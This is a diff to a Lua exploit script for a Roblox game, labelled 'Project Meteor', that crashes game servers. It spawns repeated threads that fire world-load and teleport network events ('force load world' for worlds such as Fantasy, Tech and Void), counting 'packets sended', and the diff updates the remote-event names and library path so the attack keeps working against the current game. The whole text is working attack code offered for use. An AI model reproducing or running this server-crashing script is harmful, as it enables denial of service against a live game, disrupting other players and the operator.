@@ -1,5 +1,3 @@
-getgenv().packets = 500
-
 if getgenv().packets == nil then -- Add packets if not found
     getgenv().packets = 32000
 end
@@ -44,28 +42,29 @@ local packetsended = 0
 redirectdsc() -- fire redirectdsc function
 
 
-Libreria = require(game:GetService('ReplicatedStorage').Framework.Library) -- get game library
+Libreria = {}
+Libreria.Network = require(game:GetService("ReplicatedStorage").Framework.Modules["2 | Network"])
 function Crashear() -- do crash
     spawn(function()
-        Libreria.Network.Fire('request world', "Fantasy") -- select world u want to go
+        Libreria.Network.Fire('force load world', "Fantasy") -- select world u want to go
         Libreria.Network.Fire('performed teleport') -- start teleport
         packetsended = packetsended + 1
         print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
     end)
     spawn(function()
-        Libreria.Network.Fire('request world', "Tech") -- same as the first
+        Libreria.Network.Fire('force load world', "Tech") -- same as the first
         Libreria.Network.Fire('performed teleport')
         packetsended = packetsended + 1
         print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
     end)
     spawn(function()
-        Libreria.Network.Fire('request world', "Void") -- same as the first
+        Libreria.Network.Fire('force load world', "Void") -- same as the first
         Libreria.Network.Fire('performed teleport')
         packetsended = packetsended + 1
         print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
     end)
     spawn(function()
-        Libreria.Network.Fire('request world', "Axolot") -- same as the first
+        Libreria.Network.Fire('force load world', "Axolot") -- same as the first
         Libreria.Network.Fire('performed teleport')
         packetsended = packetsended + 1
         print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
